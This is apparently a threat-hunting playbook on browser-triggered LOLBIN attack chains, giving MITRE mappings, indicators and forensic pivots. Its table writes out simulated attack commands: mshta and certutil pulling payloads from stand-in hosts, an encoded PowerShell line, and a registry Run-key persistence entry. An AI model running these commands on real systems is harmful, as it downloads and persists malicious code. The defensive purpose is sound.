#  Browser → LOLBIN Execution Chain Analysis (T1204.002)

**Explanation:** This playbook analyzes the attack chain where a user's interaction within a browser (**T1204.002, User Execution**) triggers the execution of a **Living-Off-the-Land Binary (LOLBIN)**, such as `mshta.exe` or `certutil.exe`. This is a critical **Defense Evasion (T1218)** technique. It abuses trusted, signed Windows executables to perform high-risk actions (downloading, scripting), thereby masking the malicious intent behind a legitimate process. The **LOLBIN Execution** step is the most reliable **Anchor Point** for detection.

---

## 1. Attack Flow, IOCs, and Simulated Commands

| Phase | MITRE ID & Technique | Primary Investigative Focus (IOCs) | Simulated Attack Command (Payload) |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1566.002 (Spearphishing Link) | **Network:** Malicious URL/IP accessed via browser. | (User clicks a link leading to HTA/JS file execution) |
| **Execution (ANCHOR)** | **T1218.001 (MSHTA)** | **Process:** Browser spawning a LOLBIN (`mshta.exe`). | `mshta.exe http://evil-c2-domain.com/loader.hta` |
| **Staging/Download** | T1105 (Ingress Tool Transfer) | **Process:** Download utility (`certutil.exe`) accessing external IP. | `certutil.exe -urlcache -f http://8.8.8.8/p.exe C:\Temp\stage.exe` |
| **Payload Execution** | T1059.003 (PowerShell) | **Process:** `powershell.exe` with base64/IEX flags spawned by LOLBIN. | `powershell.exe -e JgBhAGQAZgBnACAAOwAgAEkARQBYACAAKAAgACcAZwBlAHQALQBjAG8AbgB0AGUAbgB0ACAA...'` |
| **Lateral Movement (Optional)** | T1547.001 (Registry Run Keys) | **File/Registry:** Persistence mechanism created. | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateCheck" /t REG_SZ /d "C:\Temp\stage.exe"` |
| **Impact/Exfiltration** | T1041 (Exfiltration Over C2) | **Network:** High volume outbound traffic to C2 infrastructure. | (Payload begins beaconing and uploading stolen data) |

---

## 2. Key Forensic Artifacts (Data Pivot Points)

### High-Confidence Process & Command IOCs

1.  **Parent-Child Anomaly:** The most critical IOC is a standard browser process (e.g., **`chrome.exe`**, **`msedge.exe`**) acting as the **Immediate Parent** to a LOLBIN (e.g., **`mshta.exe`**, **`certutil.exe`**). This relationship is a critical, high-fidelity signature.
2.  **Download Command Line:** Any command line containing a LOLBIN name (especially `certutil` or `bitsadmin`) along with an external **`http://`** or **`https://`** URL.
3.  **Final Payload Execution:** Detection of the final payload execution, typically characterized by the LOLBIN or the dropped file spawning **`powershell.exe`** with **Base64 encoded commands** (`-e` or `-EncodedCommand`).

### File and System IOCs

1.  **File Drops:** Appearance of a new executable or script file (`.exe`, `.ps1`, `.dll`) written to a common non-standard, writable directory (e.g., **`C:\Temp`**, **`C:\Users\Public`**) immediately following the LOLBIN's execution.
2.  **External C2 IP/Domain:** The specific **IP address or domain** used in the download command (e.g., `evil-c2-domain.com`, `8.8.8.8`) is a confirmed External Indicator of Compromise.
3.  **Compromised Identity:** The user account executing the entire chain must be flagged, and all associated session tokens and credentials must be revoked immediately.
